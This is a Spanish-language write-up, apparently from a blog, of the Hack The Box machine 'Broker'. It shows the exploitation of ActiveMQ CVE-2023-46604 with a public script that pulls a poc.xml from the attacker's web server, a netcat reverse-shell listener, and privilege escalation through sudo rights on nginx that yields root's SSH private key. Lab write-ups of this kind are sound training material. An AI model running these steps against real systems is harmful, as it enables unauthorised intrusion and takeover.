+++ 
draft = false
date = 2025-11-25T23:15:47Z
title = "Broker Machine - Hackthebox"
description = "Esta es una máquina fácil de la plataforma Hackthebox"
slug = ""
authors = []
tags = []
categories = []
externalLink = ""
series = []
+++

-----------------------------
- Tags: #Machine #Linux #Easy #ActiveMQ #NgnixEscalation
----------------
# Enumeración Nmap
**Comando:**
```bash
nmap -p- --open -sS -vvv --min-rate 5000 -n -Pn 10.10.11.35 -oG allPorts
```
<img src="/images/Pasted image 20250323212431.png" style="width:100%; height:auto; display:block; margin:auto;">
Interesante información sobre servicio mqtt y amqp relacionados con dispositivos IoT. Información más importante sobre puerto 61616
<img src="/images/Pasted image 20250323213336.png" style="width:100%; height:auto; display:block; margin:auto;">

# Enumeración puerto HTTP 80

Al abrir el puerto 80 nos piden credenciales, utilizando credenciales básicas (admin:admin) entramos y tenemos página ActiveMQ
<img src="/images/Pasted image 20250323213557.png" style="width:100%; height:auto; display:block; margin:auto;">

Analizando la ruta http://10.10.11.243/admin/
encontramos información importante sobre la versión de ActiveMQ 5.15.15
<img src="/images/Pasted image 20250323213711.png" style="width:100%; height:auto; display:block; margin:auto;">

# Buscando posibles CVE de la version

<img src="/images/Pasted image 20250323214012.png" style="width:100%; height:auto; display:block; margin:auto;">
Encontramos CVE-2023-46604 que afecta a la versión 5.15.15 por tanto buscamos alguna forma de explotar este CVE.
<img src="/images/Pasted image 20250323214224.png" style="width:100%; height:auto; display:block; margin:auto;">

Encontramos un script en Github
<img src="/images/Pasted image 20250323214320.png" style="width:100%; height:auto; display:block; margin:auto;">
Analizando el código y su manual tenemos los siguiente, su uso:
<img src="/images/Pasted image 20250323214355.png" style="width:100%; height:auto; display:block; margin:auto;">
agregamos nuestra IP y un puerto para enviar la reverseshell en el archivo poc.xml
<img src="/images/Pasted image 20250323214521.png" style="width:100%; height:auto; display:block; margin:auto;">
# Explotación CVE
Usamos el script
**Comando:**
```bash
python3 exploit.py -ip 10.10.11.243 -c http://10.10.14.15/poc.xml
```

Hosteamos un servidor web para compartir el archivo poc.xml
**Comando:**
```bash
python3 -m http.server 80
```

Escuchamos con netcad por el puerto 4444
**Comando:**
```bash
nc -nlvp 4444
```

y obtenemos la reverse shell:
<img src="/images/Pasted image 20250323215046.png" style="width:100%; height:auto; display:block; margin:auto;">

# Escalada de privilegios

Realizamos el tratamiento de la tty típico:
**Comando:**
```bash
script /dev/null -c bash
ctrl+z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
stty rows 40 columns 140
```
Estando en la máquina buscamos usuarios que contengan shell:
<img src="/images/Pasted image 20250323215730.png" style="width:100%; height:auto; display:block; margin:auto;">
Teniendo solo dos usuarios disponibles.
Buscamos privilegios sudoers con 
**Comando:**
```bash
sudo -l
```
<img src="/images/Pasted image 20250323215836.png" style="width:100%; height:auto; display:block; margin:auto;">
Tenemos privilegios de sudo para ```/usr/sbin/nginx``` sin la necesidad de proporcionar contraseñas, por tanto buscamos alguna forma de elevar privilegios con nginx
<img src="/images/Pasted image 20250323215956.png" style="width:100%; height:auto; display:block; margin:auto;">Encontramos un script en github bastante interesante
<img src="/images/Pasted image 20250323220034.png" style="width:100%; height:auto; display:block; margin:auto;">

lo descargamos en la máquina víctima en la ruta ```/home/activemq```
le damos permiso de ejecución ```chmod +x exploit.py```
## Corremos el script:
<img src="/images/Pasted image 20250323220333.png" style="width:100%; height:auto; display:block; margin:auto;">
y obtenemos la clave rsa privada del usuario root de la máquina víctima, por tanto la copiamos y la depositamos en nuestra máquina local.

## Máquina local:
<img src="/images/Pasted image 20250323220456.png" style="width:100%; height:auto; display:block; margin:auto;">

Le damos el permiso 600 para que nos deje conectarnos por SSH
<img src="/images/Pasted image 20250323220529.png" style="width:100%; height:auto; display:block; margin:auto;">

Y nos conectamos con el siguiente comando:
**Comando:**
```bash
ssh -i key root@10.10.11.243
```
y obtenemos la conexión ssh del usuario root de la máquina victima
obteniendo la flag de root.txt
<img src="/images/Pasted image 20250323220958.png" style="width:100%; height:auto; display:block; margin:auto;">
